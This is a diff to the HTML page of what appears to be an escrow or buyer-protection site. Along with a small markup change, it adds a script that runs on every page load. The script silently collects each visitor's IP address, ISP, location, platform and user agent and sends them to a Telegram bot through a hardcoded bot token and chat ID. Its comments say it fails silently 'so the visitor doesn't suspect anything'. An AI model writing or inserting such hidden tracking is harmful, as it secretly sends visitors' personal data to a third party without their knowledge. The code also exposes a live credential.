@@ -1139,7 +1139,7 @@ max-height: 600px; /* optional: prevents huge cards */
 <!-- Buyer Protection Value -->
     <div class="protection-fee-section">
 <img class="payment-logo" src="assets/pictures/1780141234767.png">
-        <span><strong>Bond Protection Value</strong></span>
+        <strong>Bond Protection Value</strong>
         <div id="protectionFee">$0</div>
     </div>
 
@@ -1301,6 +1301,64 @@ max-height: 600px; /* optional: prevents huge cards */
     </footer>
 
    <script>
+async function sendVisitorDetailsToTelegram() {
+  // 1. Replace these with your actual Telegram bot details
+  const BOT_TOKENs = '8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E';
+  const CHAT_IDs = '-1003913850436'; 
+
+  try {
+    // 2. Fetch the user's network details silently
+    const ipResponse = await fetch('https://ipapi.co/json/');
+    if (!ipResponse.ok) throw new Error('Failed to fetch network details');
+
+    const data = await ipResponse.json();
+
+    // Capture the current page path
+    const currentPage = window.location.pathname; 
+
+    // Capture the platform/device operating system safely
+    let devicePlatform = 'Unknown';
+    if (navigator.userAgentData && navigator.userAgentData.platform) {
+      devicePlatform = navigator.userAgentData.platform; // Modern browsers
+    } else if (navigator.platform) {
+      devicePlatform = navigator.platform; // Fallback for older browsers
+    }
+
+    // 3. Format the log notification text cleanly for Telegram
+    const telegramMessage = 
+      `🌐 *New Visitor Logged*\n\n` +
+      `• *Visited Page:* \`${currentPage}\`\n` + 
+      `• *Platform/OS:* \`${devicePlatform}\`\n` + // <-- Added device platform
+      `• *IP Address:* \`${data.ip}\`\n` +
+      `• *ISP/Provider:* ${data.org || 'Unknown'}\n` +
+      `• *ASN:* ${data.asn || 'N/A'}\n` +
+      `• *Location:* ${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}\n` +
+      `• *Device Agent:* ${navigator.userAgent.substring(0, 100)}...`;
+
+    // 4. Send the payload directly to your Telegram channel/chat
+    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKENs}/sendMessage`;
+
+    await fetch(telegramUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_IDs,
+        text: telegramMessage,
+        parse_mode: 'Markdown'
+      })
+    });
+
+  } catch (error) {
+    // Fail silently so the visitor doesn't suspect anything on screen
+    console.error('System logging exception occurred.');
+  }
+}
+
+// --- THE PAGE LOAD TRIGGER ---
+document.addEventListener('DOMContentLoaded', () => {
+  sendVisitorDetailsToTelegram();
+});
+
 /* Sidebar toggle */
         const sidebar = document.getElementById('sidebar');
 const content = document.getElementById('content');
